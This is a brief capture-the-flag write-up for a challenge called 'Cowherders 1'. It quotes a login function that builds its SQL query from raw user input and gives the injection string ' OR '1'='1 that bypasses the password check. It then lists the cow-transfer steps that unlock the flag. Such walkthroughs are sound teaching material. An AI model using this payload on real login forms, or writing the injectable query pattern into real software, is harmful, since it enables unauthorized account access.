# Cowherders 1

1. This is clearly vulnerable to SQLi:

    ```python
    def check_auth(username, password):
        res = db.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
        user = res.fetchone()
        return user['username'] != None
    ```

    Go to `/login` and enter:

    ```text
    username: bigger_baron
    password: ' OR '1'='1
    ```

2. Go to `/transfer` and transfer 50 cows to "farmers"
3. Log into "farmers" account. Now we have 52 cows, which satisfies the condition for flag
4. Go to `/check_cows` to claim the flag
